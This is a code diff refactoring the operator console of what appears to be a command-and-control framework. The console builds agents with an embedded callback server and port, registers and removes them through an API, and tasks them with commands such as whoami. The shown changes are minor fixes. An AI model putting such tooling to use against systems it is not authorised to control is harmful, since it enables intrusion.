@@ -85,16 +85,16 @@ class ImhulluCLI(cmd.Cmd):
             return
 
         self._agent_uuid = agent_uuid
-        self.prompt = f"{agent_uuid}\n{UNDERLINE}Imhullu>{RESET} ";
+        self.prompt = f"{self._agent_uuid}\n{UNDERLINE}Imhullu>{RESET} ";
 
-    def _compile_agent(self, server, port):
+    def _compile_agent(self, agent):
         """modify agent server and port then compiler"""
         pi_server = ''
-        for char in server:
+        for char in agent.server:
             pi_server += "'" + char + "'" + ','
         pi_server += '0'  # null terminator
 
-        command = ["make", f'SERVER_M="SERVER=\\"{pi_server}\\""', f'PORT_M="PORT=\\"{port}\\""']
+        command = ["make", f'SERVER_M="SERVER=\\"{pi_server}\\""', f'PORT_M="PORT=\\"{agent.port}\\""']
         process = subprocess.Popen(command, cwd="../agent/", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
         while True:
@@ -123,7 +123,9 @@ class ImhulluCLI(cmd.Cmd):
         server = args[1]
         port = args[2]
 
-        self._compile_agent(server, port)
+        agent = Agent(name=name, server=server, port=port)
+
+        self._compile_agent(agent)
 
         create_agent_payload = {
             "name": name
@@ -143,6 +145,7 @@ class ImhulluCLI(cmd.Cmd):
         remove_agent_payload = {
             "uuid": uuid
         }
+
         endpoint = "/remove_agent/"
         remove_agent_payload_json = json.dumps(remove_agent_payload)
         print(self._api_post_req(endpoint, post_data=remove_agent_payload_json))
@@ -182,7 +185,7 @@ class ImhulluCLI(cmd.Cmd):
             "agent_uuid": self._agent_uuid
         }
 
-        print(self._create_task(task)) + '\n'
+        print(self._create_task(task) + '\n')
 
     @agent_uuid_required
     def do_whoami(self, line):
